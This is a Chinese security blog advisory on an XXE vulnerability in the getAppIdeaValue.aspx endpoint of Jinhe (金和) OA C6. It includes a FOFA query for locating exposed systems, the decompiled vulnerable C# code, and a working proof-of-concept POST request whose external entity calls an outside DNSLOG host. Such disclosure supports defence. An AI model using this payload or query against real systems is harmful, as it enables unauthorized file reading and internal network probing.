---
title: "金和OA getAppIdeaValue.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-getAppIdeaValue-xxe.html
asset_dir: assets/金和oa-getappideavalue.aspx-xxe漏洞
---

# 金和OA getAppIdeaValue.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/1/23 13:31
- 205浏览
- [0评论](#comment)
- 10分钟阅读

深入探索

编程语言教程

企业安全咨询

在线安全工具

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `getAppIdeaValue.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞预警服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

深入探索

SQL注入检测工具

漏洞修复方案

网络安全培训

直接根据 `getAppIdeaValue.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Govset.dll` 将其进行反编译后找到 **getAppIdeaValue** 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  Stream inputStream = this.Request.InputStream;
  byte[] numArray = new byte[(int) inputStream.Length];
  inputStream.Read(numArray, 0, numArray.Length);
  inputStream.Close();
  string xml = Encoding.UTF8.GetString(numArray);
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.LoadXml(xml);
```

请求内容直接使 `XmlDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

```
POST /c6/Jhsoft.Web.govset/getAppIdeaValue.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

深入探索

安全研究工具

数据库

安全研究报告

在DNSLOG平台成功收到请求

网络安全

[![金和OA getAppIdeaValue.aspx XXE漏洞](images/img-001-ab40f77f1ff8.webp)](https://image.mrxn.net/b12efeef8c1a4140adbccbbbda98c37e.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
